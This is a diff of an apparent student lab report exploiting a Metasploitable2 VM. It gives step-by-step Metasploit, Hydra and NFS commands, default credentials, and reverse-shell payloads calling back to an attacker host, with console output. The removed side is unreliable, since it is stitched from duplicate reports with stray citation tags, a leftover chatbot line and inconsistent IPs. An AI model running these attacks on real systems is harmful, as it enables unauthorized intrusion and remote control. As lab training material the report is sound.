@@ -1,665 +1,251 @@
 # Metasploitable2 Exploitation Report
 
-**Name:** Casmir Sraha
+**Name:** Sraha Casmir
 **Index Number:** 7363623
-**Date:** 2026-09-20
+**Date:** October 1, 2026
 **Target IP:** 192.168.1.3
-**Attacker OS / Tools:** Kali Linux, Metasploit Framework, nmap 7.x
+**Attacker OS / Tools:** Kali Linux, Metasploit Framework, Nmap, Netcat
 
 ---
 
 ## Reconnaissance Summary
-bash
-nmap -sV -p 80 10.0.2.5
 
-An `nmap` service scan targeting Port 80 revealed that the host is running **Apache httpd 2.2.8** on Ubuntu. 
-Further enumeration using Metasploit's HTTP version scanner (`auxiliary/scanner/http/http_version`) identified that the web server is powered by PHP. 
-Accessing `phpinfo.php` directly confirmed the detailed version running is **PHP 5.2.4-2ubuntu5.10** with Server API set to CGI/FastCGI.
+Initial host enumeration was conducted using a comprehensive TCP port and service detection scan:
+`nmap -p- -sV -sC 192.168.1.3`
+
+The scan identified a broad attack surface with multiple vulnerable, legacy, and misconfigured services running:
+- **FTP (Port 21):** vsftpd 2.3.4 (known vulnerable backdoor) alongside anonymous access.
+- **SSH (Port 22) & Telnet (Port 23):** Remote administrative management services.
+- **HTTP / Web (Ports 80, 8180):** Apache httpd and Apache Tomcat/Coyote JSP engine with default administrative manager portals.
+- **RPC / NFS (Ports 111, 2049):** Network File System with wildcard root export configuration.
+- **SMB (Ports 139, 445):** Samba 3.X service containing unauthenticated command execution flaws.
+- **distccd (Port 3632):** Distributed compiler daemon accepting unauthenticated compilation tasks.
+- **PostgreSQL (Port 5432):** Database service accessible with standard default credentials.
+- **VNC (Port 5900):** Virtual Network Computing service configured with a weak password.
+- **IRC (Port 6667):** Unreal3.2.8.1 IRC daemon containing an embedded backdoor.
+- **Ingreslock (Port 1524):** Open root-level bind shell.
 
 ---
 
-## Exploit 1: PHP CGI Argument Injection
+## Exploit 1: NFS Unrestricted Share
 
-- **Service / Port:** HTTP / 80
-- **Vulnerability:** PHP CGI Argument Injection (CVE-2012-1823 / CVE-2012-2311)
-- **Tool Used:** Metasploit – `exploit/multi/http/php_cgi_arg_injection`
-- **Why This Tool:** The Metasploit `php_cgi_arg_injection` module specifically targets web servers running PHP under CGI mode that fail to properly sanitize command-line flags pass-through, allowing direct execution of arbitrary PHP code.
+- **Service / Port:** NFS / 2049
+- **Vulnerability:** Misconfigured NFS export — root filesystem (`/`) shared with no host restriction
+- **Tool Used:** `showmount` and `mount` (native NFS client tools)
+- **Why This Tool:** No exploit module is needed for a misconfiguration like this — the export itself grants access. Native OS tools are the correct choice because they interact with NFS exactly as a legitimate client would; using Metasploit here would add nothing.
 - **Steps:**
-  1. `msfconsole`
-  2. `use exploit/multi/http/php_cgi_arg_injection`
-  3. `set RHOSTS 192.168.1.3`
-  4. `exploit`
-- **Evidence:** `/home/kali/evidence/exploit_multi_http_php_cgi_arg_injection.png`
-- **Cyber Kill Chain Stage(s):** Weaponization, Exploitation, C2
-  - *Weaponization & Exploitation:* The exploit crafts a malicious query string passed to the PHP-CGI binary to execute arbitrary code.
-  - *C2 / Execution:* A reverse Meterpreter shell session is successfully established on the target machine.
-- **Outcome / Impact:** Gained interactive command execution (Meterpreter shell) on the target host as the web server service user (`www-data`).
+  1. `showmount -e 192.168.1.3` → returned `Export list for 192.168.1.3: / *`, confirming the root filesystem is exported to any host (`*`).
+  2. `sudo mkdir -p /mnt/nfs`
+  3. `sudo mount -t nfs 192.168.1.3:/ /mnt/nfs`
+  4. `ls -la /mnt/nfs` → full root directory listing returned (`bin`, `boot`, `etc`, `home`, `lib`, `root`, `var`, etc. — effectively the entire target filesystem).
+  5. `sudo umount /mnt/nfs` (cleanup)
+- **Evidence:** `evidence/exploit1.jpg`
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Actions on Objectives
+  - Reconnaissance: `showmount -e` enumerated the export list and revealed the wildcard (`*`) share before any access was attempted.
+  - Delivery: The `mount` command is what actually delivers the request that establishes access to the share.
+  - Actions on Objectives: Listing (`ls -la`) and having read/write access to the full remote filesystem.
+- **Outcome / Impact:** Full read/write access to the target's root filesystem from an unauthenticated remote host — no credentials or payload required.
 
 ---
 
-## Kill Chain Coverage Summary
-
-| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
-|---|---|---|---|---|---|---|---|
-| 1. PHP CGI Argument Injection | ✓ | ✓ | ✓ | ✓ | | ✓ | ✓ |
-
----
-
-## Lessons Learned / Mitigations (optional but recommended)
-
-1. **Update PHP:** Upgrade PHP to a supported version that patches the CGI argument parsing vulnerability (CVE-2012-1823).
-2. **Disable Unnecessary CGI Handlers:** Avoid running PHP as a standalone CGI binary; instead, utilize modern execution methods like PHP-FPM or FastCGI with properly constrained parameter configs.
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-# Metasploitable2 Exploitation Report
-
-**Name:** Sraha Kwame Casmir
-**Index Number:** 7363623
-**Date:** 2026-09-20
-**Target IP:** 192.168.1.3
-**Attacker OS / Tools:** Kali Linux, Metasploit Framework, Wireshark, Telnet Client
-
----
-
-## Reconnaissance Summary
-
-Initial enumeration was performed by probing Port 23 (Telnet) on the target host. Because Telnet transfers network traffic in unencrypted clear text, **Wireshark** was launched on interface `eth0` to capture authentication packets during connection. By inspecting the TCP stream (`Follow > TCP Stream`), login credentials (`msfadmin:msfadmin`) were identified directly in clear text.
-
----
-
-
-
-```
-
-PORT   STATE SERVICE VERSION
-23/tcp open  telnet  Linux telnetd
-
-```
-
----
-
-## Exploit 2: Telnet Cleartext Credential Reuse & Brute Force
-
-- **Service / Port:** Telnet / 23
-- **Vulnerability:** Unencrypted Cleartext Authentication / Weak Credentials
-- **Tool Used:** Metasploit – `auxiliary/scanner/telnet/telnet_login`
-- **Why This Tool:** The `telnet_login` scanner module automates authentication attempts against Telnet endpoints using wordlists and opens a interactive shell session once valid credentials (`msfadmin:msfadmin`) are authenticated.
-- **Steps:**
-  1. `msfconsole`
-  2. `use auxiliary/scanner/telnet/telnet_login`
-  3. `set RHOSTS 192.168.1.3`
-  4. `set USER_FILE /usr/share/wordlists/metasploit/root_userpass.txt`
-  5. `set PASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt`
-  6. `set STOP_ON_SUCCESS true`
-  7. `run`
-  8. `sessions -u 1` 
-  9. `sessions 2`
-- **Evidence:** `/home/kali/evidence/exploit_telnet.png`
-- **Cyber Kill Chain Stage(s):** Reconnaissance, Exploitation, C2
-  - *Reconnaissance:* Sniffing network packets in Wireshark allowed cleartext credential recovery.
-  - *Exploitation:* Automated authentication using the harvested credentials yielded interactive shell access.
-  - *C2:* Upgrading the command shell to a Meterpreter session established an interactive command-and-control channel.
-- **Outcome / Impact:** Gained interactive shell access to the host as user `msfadmin` and upgraded the connection to a Meterpreter C2 session.
-
----
-
-## Kill Chain Coverage Summary
-
-| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
-|---|---|---|---|---|---|---|---|
-| 1. Telnet Cleartext Credential Reuse | ✓ | | ✓ | ✓ | | ✓ | ✓ |
-
----
-
-## Lessons Learned / Mitigations (optional but recommended)
-
-1. **Disable Unencrypted Telnet:** Replace the legacy Telnet service with Secure Shell (SSH) to enforce strong end-to-end encryption.
-2. **Enforce Password Policies:** Replace default accounts (`msfadmin:msfadmin`) with robust authentication credentials.
-
-```
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-# Metasploitable2 Exploitation Report
-
-**Name:** Sraha Kwame Casmir
-**Index Number:** 7363623
-**Date:** 2026-09-20
-**Target IP:** 192.168.1.3
-**Attacker OS / Tools:** Kali Linux, Metasploit Framework
-
----
-
-## Reconnaissance Summary
-
-Initial enumeration was performed by checking prior Nmap scan results targeting TCP Port 22[cite: 7]. The scan confirmed that OpenSSH 4.7p1 was running on the target Debian host.
-
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
-
-
----
-
-## Reconnaissance Summary
-
-Initial enumeration was performed by checking prior Nmap scan results targeting TCP Port 22. The scan confirmed that OpenSSH 4.7p1 was running on the target Debian host.
-
-
-```
-
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
-
-```
-
----
-
-## Exploit 3: SSH Credential Brute Force & Login Exploitation
-
-- **Service / Port:** SSH / 22
-- **Vulnerability:** Weak / Default Credentials (Brute Force Susceptibility)
-- **Tool Used:** Metasploit – `auxiliary/scanner/ssh/ssh_login`
-- **Why This Tool:** The `ssh_login` auxiliary module performs automated SSH login attempts against target systems using specified user and password dictionary files, automatically opening a command shell session upon finding valid credentials.
-- **Steps:**
-  1. `msfconsole`
-  2. `search ssh_login`
-  3. `use auxiliary/scanner/ssh/ssh_login`
-  4. `set RHOSTS 192.168.1.3
-  5. `set USER_FILE /root/users.txt
-  6. `set PASS_FILE /root/passwords.txt
-  7. `set STOP_ON_SUCCESS true
-  8. `exploit
-  9. `sessions -u 1` (upgrades basic command shell to a Meterpreter session)
-  10. `sessions 2
-  11. `sysinfo
-- **Evidence:** `/home/kali/evidence/exploit_ssh_login.png
-- **Cyber Kill Chain Stage(s):** Reconnaissance, Exploitation, C2
-  - *Reconnaissance:* Enumerating Port 22 and identifying the SSH service version.
-  - *Exploitation:* Automated password dictionary attack yielding valid credentials (`msfadmin:msfadmin`).
-  - *C2 / Execution:* Upgrading the active SSH shell to a Meterpreter payload session.
-- **Outcome / Impact:** Discovered valid SSH credentials (`msfadmin:msfadmin`), obtained interactive shell access to the host, and successfully upgraded to a Meterpreter session.
-
----
-
-## Kill Chain Coverage Summary
-
-| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
-|---|---|---|---|---|---|---|---|
-| 1. SSH Credential Brute Force | ✓ | | ✓ | ✓ | | ✓ | ✓ |
-
----
-
-## Lessons Learned / Mitigations (optional but recommended)
-
-1. **Enforce Strong Passwords & Disable Defaults:** Ensure default accounts such as `msfadmin` have strong passwords or are disabled.
-2. **Implement Fail2ban:** Use brute-force detection tools like `fail2ban` to lock out IP addresses attempting multiple invalid SSH logins.
-3. **Use Key-Based Authentication:** Disable password authentication for SSH (`PasswordAuthentication no`) in favor of public key cryptography.
-
-```
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-# Metasploitable2 Exploitation Report
-
-**Name:** Sraha Kwame Casmir
-**Index Number:** 7363623
-**Date:** 2026-09-20
-**Target IP:** 192.168.1.3
-**Attacker OS / Tools:** Kali Linux, Metasploit Framework, Netcat (`nc`), `smtp-user-enum`
-
----
-
-## Reconnaissance Summary
-
-Initial service discovery confirmed Port 25 (SMTP) was open on the Metasploitable2 instance running Postfix ESMTP[cite: 7]. Direct testing via Netcat (`nc 10.0.2.5 25`) confirmed that the server responds to SMTP service commands, such as `VRFY'.
-
-
-
-
-PORT   STATE SERVICE VERSION
-25/tcp open  smtp    Postfix smtpd
-
-```
-
-Testing the `VRFY` command interactively confirmed active users on the system:
-- `VRFY msfadmin` -> Returned `250 2.0.0 msfadmin` (User exists)
-- `VRFY Pat` -> Returned `550 5.1.1 <Pat>: Recipient address rejected` (User does not exist)
-
----
-
-## Exploit 4: SMTP User Enumeration & VRFY Probe
-
-- **Service / Port:** SMTP / 25
-- **Vulnerability:** Unrestricted SMTP User Enumeration / Active `VRFY` Command
-- **Tool Used:** Metasploit – `auxiliary/scanner/smtp/smtp_enum` & `smtp-user-enum`]
-- **Why This Tool:** The `smtp_enum` module and standalone `smtp-user-enum` tool leverage implementation mechanisms (such as `VRFY`, `EXPN`, or `RCPT TO`) to enumerate system account names without authenticating[cite: 7]. This exposes valid username accounts for subsequent credential-based attacks.
-- **Steps:**
-  1. Interactive verification via Netcat:
-     `nc 192.168.1.8 25`
-     `VRFY msfadmin
-  2. Enumeration via `smtp-user-enum`:
-     `smtp-user-enum -M VRFY -U users.txt -t 192.168.1.3`
-  3. Automated full dictionary enumeration via Metasploit:
-     `msfconsole`[
-     `use auxiliary/scanner/smtp/smtp_enum`
-     `set RHOSTS 192.168.1.3`
-     `set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt`
-     `run`
-- **Evidence:** /home/kali/evidence/exploit_smtp.png
-- **Cyber Kill Chain Stage(s):** Reconnaissance
-  - *Reconnaissance:* Enumerating valid local system usernames (`msfadmin`, `root`, `backup`, `bin`, `daemon`, etc.) over the open SMTP service.
-- **Outcome / Impact:** Discovered local user accounts registered on the system without requiring authentication, exposing target usernames for credential brute-forcing.
-
----
-
-## Kill Chain Coverage Summary
-
-| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
-|---|---|---|---|---|---|---|---|
-| 1. SMTP User Enumeration | ✓ | | | | | | |
-
----
-
-## Lessons Learned / Mitigations (optional but recommended)
-
-1. **Disable `VRFY` and `EXPN` Commands:** Configure the SMTP daemon (Postfix) to disable user verification commands by adding `disable_vrfy_command = yes` in `main.cf`.
-2. **Restrict Internal Enumeration:** Limit SMTP access using internal firewalls or host-based access controls to prevent unauthorized network scanning and enumeration.
-
-```
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-# Metasploitable2 Exploitation Report
-
-**Name:** Sraha Kwame Casmir
-**Index Number:** 7363623
-**Date:** 2026-09-20
-**Target IP:** 192.168.1.3
-**Attacker OS / Tools:** Kali Linux, Nmap, Hydra, Searchsploit, Metasploit Framework, FTP Client
-
----
-
-## Reconnaissance Summary
-
-Service enumeration was conducted using Nmap across all ports (`nmap -p- -sV -oN MS2.txt 10.0.2.5`). Port 21 was identified as running an outdated FTP service.
-
----
-
-## Reconnaissance Summary
-
-Service enumeration was conducted using Nmap across all ports (`nmap -p- -sV -oN MS2.txt 19.168.1.3`). Port 21 was identified as running an outdated FTP service.
-
-
-```
-
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 2.3.4
-
-```
-
----
-
-## Exploit 5: FTP Credential Brute Force & Login
-
-- **Service / Port:** FTP / 21
-- **Vulnerability:** Weak Credentials / Password Dictionary Susceptibility
-- **Tool Used:** Hydra
-- **Why This Tool:** Hydra allows parallelized dictionary attacks against remote authentication services. Using crafted username and password wordlists (`users.txt` and `passwords.txt`), it rapidly identifies valid account credentials.
-- **Steps:**
-  1. Create custom wordlists:
-     `nano users.txt` (containing `msfadmin`, `service`, `user`, etc.)
-     `nano passwords.txt`
-  2. Execute brute-force attack:
-     `hydra -L users.txt -P passwords.txt 10.0.2.5 ftp`
-  3. Log in interactively via FTP:
-     `ftp 10.0.2.5`
-     Authenticate using `msfadmin:msfadmin`
-- **Evidence:** `/home/kali/evidence/exploit_ftp _via_hydra.png`
-- **Cyber Kill Chain Stage(s):** Reconnaissance, Exploitation
-  - *Reconnaissance:* Scanning open ports and creating targeted credential lists.
-  - *Exploitation:* Automated credential guessing yielding valid login credentials (`msfadmin:msfadmin`).
-- **Outcome / Impact:** Successfully obtained valid FTP login credentials and authenticated to the server filesystem.
-
----
-
-## Exploit 6: vsftpd 2.3.4 Backdoor Command Execution
-
-- **Service / Port:** FTP / 21[cite: 7]
-- **Vulnerability:** vsftpd 2.3.4 Backdoor Command Execution (CVE-2011-2523)
-- **Tool Used:** Searchsploit & Metasploit – `exploit/unix/ftp/vsftpd_234_backdoor`
-- **Why This Tool:** The vsftpd 2.3.4 software distribution contained a known backdoor that opens a listening shell on TCP port 6200 when a username ending with `:)` is supplied during authentication. Metasploit automates this exploit sequence to deliver a root-level shell.
-- **Steps:**
-  1. Search for public exploits:
-     `searchsploit vsftpd 2.3.4`
-  2. Launch Metasploit console:
-     `msfconsole`
-  3. `use exploit/unix/ftp/vsftpd_234_backdoor`
-  4. `set RHOSTS 192.168.1.3`
-  5. `exploit`
-  6. Verify session root access:
-     `whoami` (returns `root`)
-- **Evidence:** /home/kali/evidence/exploit_ftp_via_vspdft.png`
-- **Cyber Kill Chain Stage(s):** Weaponization, Exploitation, Actions on Objectives
-  - *Weaponization:* Loading the pre-packaged vsftpd backdoor exploit module.
-  - *Exploitation:* Triggering the malicious FTP authentication sequence to spawn the backdoor.
-  - *Actions on Objectives:* Achieving elevated `root` system privileges over a command shell.
-- **Outcome / Impact:** Successfully obtained root-level command shell access to the host.
-
----
-
-## Kill Chain Coverage Summary
-
-| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
-|---|---|---|---|---|---|---|---|
-| 1. FTP Credential Brute Force | ✓ | | ✓ | ✓ | | | |
-| 2. vsftpd 2.3.4 Backdoor | ✓ | ✓ | ✓ | ✓ | | ✓ | ✓ |
-
----
-
-## Lessons Learned / Mitigations (optional but recommended)
-
-1. **Update / Patch Software:** Upgrade `vsftpd` to a safe, supported version or replace it with a secure FTP daemon (e.g., `ProFTPD` or `SFTP`).
-2. **Remove Backdoored Binaries:** Ensure software binaries originate from verified, cryptographically signed repositories.
-3. **Enforce Strong Credentials:** Change default user account passwords to prevent automated dictionary attacks.
-
-```
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-# Metasploitable2 Exploitation Report
-
-**Name:** Sraha Kwame Casmir
-**Index Number:** 7363623
-**Date:** 2026-09-20
-**Target IP:** 192.168.1.3
-**Attacker OS / Tools:** Kali Linux, Nmap, Metasploit Framework, VNC Viewer (`vncviewer`)
-
----
-
-## Reconnaissance Summary
-
-Service discovery targeting TCP Port 5900 confirmed that Virtual Network Computing (VNC) protocol version 3.3 was active on the target server.
-
-PORT     STATE SERVICE VERSION
-5900/tcp open  vnc     VNC (protocol 3.3)
-
-
-
-
-Here is the complete report based on the VNC exploitation walkthrough video.
-
-```markdown
-# Metasploitable2 Exploitation Report
-
-**Name:** Sraha Kwame Casmir
-**Index Number:** 7363623
-**Date:** 2026-09-20
-**Target IP:** 192.168.1.3
-**Attacker OS / Tools:** Kali Linux, Nmap, Metasploit Framework, VNC Viewer (`vncviewer`)
-
----
-
-## Reconnaissance Summary
-
-Service discovery targeting TCP Port 5900 confirmed that Virtual Network Computing (VNC) protocol version 3.3 was active on the target server.
-
-
-```
-
-PORT     STATE SERVICE VERSION
-5900/tcp open  vnc     VNC (protocol 3.3)
-
-```
-
----
-
-## Exploit 7: VNC Weak Password Brute Force & GUI Session Access
+## Exploit 2: VNC Weak Password
 
 - **Service / Port:** VNC / 5900
-- **Vulnerability:** Weak / Default VNC Authentication Password
-- **Tool Used:** Metasploit – `auxiliary/scanner/vnc/vnc_login` & `vncviewer`
-- **Why This Tool:** The `vnc_login` scanner module tests common VNC passwords against the server to locate valid authentication credentials[cite: 7]. Once a valid credential (`password`) is identified, `vncviewer` is used to launch a interactive graphical desktop session.
+- **Vulnerability:** Weak/default authentication password
+- **Tool Used:** `auxiliary/scanner/vnc/vnc_login` (Metasploit) + `vncviewer`
+- **Why This Tool:** The Metasploit scanner module automates credential testing against the VNC RFB protocol far faster than manual connection attempts, and hands off a confirmed working password directly for use with a viewer.
 - **Steps:**
-  1. `msfconsole`
-  2. `search vnc_login`
-  3. `use auxiliary/scanner/vnc/vnc_login`
-  4. `set RHOSTS 192.168.1.3`
-  5. `set USERNAME root`
-  6. `run`
-  7. Launch VNC client using the discovered password (`password`):
-     `vncviewer 10.0.2.5`
-  8. Enter `password` at the authentication prompt.
-- **Evidence:** `evidence/exploit_vnc.png`
-- **Cyber Kill Chain Stage(s):** Reconnaissance, Exploitation, Actions on Objectives
-  - *Reconnaissance:* Identifying open TCP Port 5900 running VNC.
-  - *Exploitation:* Automated credential checking discovering the default password `password`.
-  - *Actions on Objectives:* Establishing an interactive graphical desktop session with `root` privileges on the host.
-- **Outcome / Impact:** Discovered a weak default VNC password (`password`) and gained full graphical desktop access to the remote system.
+  1. `search vnc_login` to locate `auxiliary/scanner/vnc/vnc_login`.
+  2. `use auxiliary/scanner/vnc/vnc_login`
+  3. `set RHOSTS 192.168.1.3`
+  4. `run` → `192.168.1.3:5900 - Login Successful: :password` (password found: `password`)
+  5. `vncviewer 192.168.1.3` → first connection attempt returned "Authentication failure" (password entered incorrectly/mistyped).
+  6. `vncviewer 192.168.1.3` → second attempt succeeded: "Authentication successful", desktop identified as `root's X desktop (metasploitable:0)`.
+- **Evidence:** `evidence/exploit2.jpg`
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Actions on Objectives
+  - Reconnaissance/Weaponization: Selecting and configuring the login-scanner module against the target.
+  - Delivery: Sending the authentication attempts to the VNC service.
+  - Exploitation: Successful authentication with the weak password.
+  - Actions on Objectives: Full interactive graphical desktop access, including a root terminal visible inside the session.
+- **Outcome / Impact:** Interactive graphical (GUI) access to the target as root.
 
 ---
 
-## Kill Chain Coverage Summary
+## Exploit 3: Tomcat Manager Default Login
 
-| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
-|---|---|---|---|---|---|---|---|
-| 1. VNC Weak Credential Exploitation | ✓ | | ✓ | ✓ | | ✓ | ✓ |
-
----
-
-## Lessons Learned / Mitigations (optional but recommended)
-
-1. **Disable Legacy VNC Services:** Replace obsolete unencrypted remote access protocols like VNC with encrypted alternatives (e.g., SSH with X11 forwarding or secure RDP).
-2. **Enforce Strong Password Policies:** Change weak or default VNC passwords to long, complex passphrases.
-3. **Restrict Network Access:** Implement firewall rules to block port 5900 from direct exposure to public or untrusted networks.
-
-```
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-# Metasploitable2 Exploitation Report
-
-**Name:** Sraha Kwame Casmir
-**Index Number:** 7363623
-**Date:** 2026-09-20
-**Target IP:** 192.168.1.3
-**Attacker OS / Tools:** Kali Linux, Nmap, Metasploit Framework, MySQL Client (`mysql`)
-
----
-
-## Reconnaissance Summary
-
-Service discovery targeting TCP Port 3306 confirmed that MySQL Server version 5.0.51a was active on the target machine.
-
-
-```
-
-PORT     STATE SERVICE VERSION
-3306/tcp open  mysql   MySQL 5.0.51a-3u1
-
-```
-
----
-
-## Exploit 8: MySQL Credential Brute Force & Remote Database Access
-
-- **Service / Port:** MySQL / 3306
-- **Vulnerability:** Unauthenticated / Blank Root Password (Weak Default Configuration)
-- **Tool Used:** Metasploit – `auxiliary/scanner/mysql/mysql_login` & `mysql` client
-- **Why This Tool:** The `mysql_login` module tests dictionary wordlists against the MySQL service to locate valid user credentials. Once valid credentials (`root` with an empty password) are discovered, the native MySQL client is used to establish remote database connection.
+- **Service / Port:** Apache Tomcat / 8180
+- **Vulnerability:** Default credentials on the Tomcat Manager application (`tomcat:tomcat`)
+- **Tool Used:** `exploit/multi/http/tomcat_mgr_upload`
+- **Why This Tool:** This module automates the entire WAR-upload attack chain — authenticating to the manager interface, packaging a payload as a deployable WAR, and triggering it via Tomcat's own deploy mechanism — rather than performing each HTTP request by hand.
 - **Steps:**
-  1. `msfconsole`
-  2. `search mysql_login`
-  3. `use auxiliary/scanner/mysql/mysql_login`
-  4. `set RHOSTS 192.168.1.3
-  5. `set USER_PASS_FILE /usr/share/wordlists/metasploit/unix_users.txt`
-  6. `run`[cite: 7]
-  7. Connect remotely using the discovered `root` user account without password:
-     `mysql -u root -h 192.168.1.3 -p`
-  8. Press `Enter` at the password prompt.
-  9. Enumerate databases:
-     `SHOW DATABASES;`
-- **Evidence:** `evidence/exploit_mysql.png`
-- **Cyber Kill Chain Stage(s):** Reconnaissance, Exploitation, Actions on Objectives
-  - *Reconnaissance:* Identifying open TCP Port 3306 running MySQL.
-  - *Exploitation:* Automated credential checking discovering the blank `root` password.
-  - *Actions on Objectives:* Logging into the database engine with full administrative (`root`) privileges to view hosted databases.
-- **Outcome / Impact:** Successfully obtained administrative access to the remote MySQL database server without password authentication, permitting unrestricted database querying and potential data extraction.
+  1. `search tomcat_mgr_upload`
+  2. `use exploit/multi/http/tomcat_mgr_upload`
+  3. `set RHOSTS 192.168.1.3`
+  4. `set RPORT 8180`
+  5. `set HttpUsername tomcat`
+  6. `set HttpPassword tomcat`
+  7. `set LHOST 192.168.1.4`
+  8. `run` → retrieved session ID/CSRF token, uploaded and deployed `Wdjo0p1007i0gVlg...`, executed it, then undeployed it automatically.
+- **Evidence:** `evidence/exploit3.jpg`
+- **Cyber Kill Chain Stage(s):** Delivery, Exploitation (attempted — not confirmed)
+  - Delivery: The WAR payload was successfully uploaded and deployed to the manager app.
+  - Exploitation: The deployed WAR was executed by Tomcat.
+- **Outcome / Impact — ⚠️ Not fully confirmed.** The console output explicitly reads `"Exploit completed, but no session was created."` The default-credential authentication and WAR deployment both worked, but no reverse shell/session was caught in this run.
 
 ---
 
-## Kill Chain Coverage Summary
+## Exploit 4: PostgreSQL Payload Execution
 
-| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
-|---|---|---|---|---|---|---|---|
-| 1. MySQL Blank Root Credential Access | ✓ | | ✓ | ✓ | | | ✓ |
-
----
-
-## Lessons Learned / Mitigations (optional but recommended)
-
-1. **Set Strong Root Passwords:** Assign a strong administrative password to the MySQL `root` account immediately after installation using `mysql_secure_installation'.
-2. **Restrict Network Binding:** Bind MySQL to `127.0.0.1` (localhost) in `my.cnf` if remote database access is not required.
-3. **Firewall Access Controls:** Restrict remote access to TCP Port 3306 using network firewalls or host-based IP whitelisting.
-
-```
-
-
-
-
-
-
-
-
-
-
-# Metasploitable2 Exploitation Report
-
-**Name:** Sraha Kwame Casmir
-**Index Number:** 7363623
-**Date:** 2026-09-21
-**Target IP:** 19.168.1.3
-**Attacker OS / Tools:** Kali Linux, Nmap, Hydra, FTP Client (`ftp`)
+- **Service / Port:** PostgreSQL / 5432
+- **Vulnerability:** Default credentials (`postgres:postgres`)
+- **Tool Used:** `exploit/linux/postgres/postgres_payload`
+- **Why This Tool:** This module logs in with the known default credentials and uses PostgreSQL's ability to load a compiled shared object (`.so`) as a user-defined function — turning an authenticated DB session into arbitrary OS command execution.
+- **Steps:**
+  1. `search postgres_payload`
+  2. `use exploit/linux/postgres/postgres_payload`
+  3. `set RHOSTS 192.168.1.3`
+  4. `set USERNAME postgres`
+  5. `set PASSWORD postgres`
+  6. `set LHOST 192.168.1.4`
+  7. `run` → connected to PostgreSQL 8.3.1 on i486-pc-linux-gnu, uploaded `/tmp/WHQIYLPK.so`, sent the Meterpreter stage, and opened **Meterpreter session 4**.
+  8. `getuid` → `Server username: postgres`
+  9. `sysinfo` → Computer: `metasploitable.localdomain`, OS: Ubuntu 8.04 (Linux 2.6.24-16-server), Architecture: i686, Meterpreter: x86/linux.
+- **Evidence:** `evidence/exploit4.jpg`
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
+  - Delivery: The shared object was uploaded to `/tmp`.
+  - Exploitation/Installation: Loading the `.so` executed code and established the foothold.
+  - C2: The Meterpreter session itself is the command-and-control channel.
+  - Actions on Objectives: `getuid` and `sysinfo` enumeration of the compromised host.
+- **Outcome / Impact:** Confirmed remote code execution and an active Meterpreter session as the `postgres` user.
 
 ---
 
-## Reconnaissance Summary
+## Exploit 5: DistCC Command Execution
 
-Service discovery targeting TCP Port 21 confirmed that vsftpd version 2.3.4 was running on the target system.
-
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 2.3.4
+- **Service / Port:** distccd / 3632
+- **Vulnerability:** CVE-2004-2687 — distccd accepts and executes compilation jobs from any client with no authentication
+- **Tool Used:** `exploit/unix/misc/distcc_exec`
+- **Why This Tool:** distccd is designed to execute whatever compiler command it's handed, with no authentication — this module simply sends a crafted command instead of a real build job, which is exactly the daemon's intended behavior turned against it.
+- **Steps:**
+  1. `search distcc`
+  2. `use exploit/unix/misc/distcc_exec`
+  3. `set RHOSTS 192.168.1.3`
+  4. `set LHOST 192.168.1.4`
+  5. `run` with the default payload (`cmd/unix/reverse_bash`) — failed: `stderr: bash: 49: Bad file descriptor` / `/dev/tcp/192.168.1.4/4444: No such file or directory`. The target's shell lacks `/dev/tcp` support for a bash-based reverse shell.
+  6. `set PAYLOAD cmd/unix/reverse_perl` — switched payloads since the target's `bash` build doesn't support the needed redirection.
+  7. `run` again → **Command shell session 5 opened**.
+  8. `whoami` → `daemon`
+  9. `id` → `uid=1(daemon) gid=1(daemon) groups=1(daemon)`
+- **Evidence:** `evidence/exploit5.jpg`
+- **Cyber Kill Chain Stage(s):** Weaponization, Delivery, Exploitation, C2
+  - Weaponization: Initial payload choice failed; re-weaponizing with a Perl-based reverse shell was required for the target's environment.
+  - Delivery/Exploitation: Sending the crafted "compile" command that the daemon executed.
+  - C2: The resulting shell session.
+- **Outcome / Impact:** Remote command execution as the `daemon` user. Notably required payload troubleshooting — the default bash reverse shell doesn't work against this target, Perl does.
 
 ---
 
-## Exploit 9: FTP Credential Brute-Force via Hydra
+## Exploit 6: UnrealIRCd Backdoor
+
+- **Service / Port:** IRC / 6667
+- **Vulnerability:** Intentionally backdoored source code in this UnrealIRCd 3.2.8.1 build — any line containing a specific trigger string is executed as a shell command
+- **Tool Used:** `exploit/unix/irc/unreal_ircd_3281_backdoor`
+- **Why This Tool:** The backdoor only triggers on a specific crafted string sent over the IRC protocol; the module handles registering a fake IRC user and sending that exact trigger, which would be tedious and error-prone to replicate by hand with raw netcat.
+- **Steps:**
+  1. `use exploit/unix/irc/unreal_ircd_3281_backdoor`
+  2. `set RHOSTS 192.168.1.3`
+  3. `set LHOST 192.168.1.4`
+  4. `run` → connected to port 6667, registered IRC user, target confirmed vulnerable via IRC commands, backdoor command sent — `"Exploit completed, but no session was created."`
+  5. `set PAYLOAD cmd/unix/reverse`
+  6. `run` again → connected with a new IRC user, same vulnerability confirmation and backdoor trigger sent — again `"Exploit completed, but no session was created."`
+- **Evidence:** `evidence/exploit6.jpg`
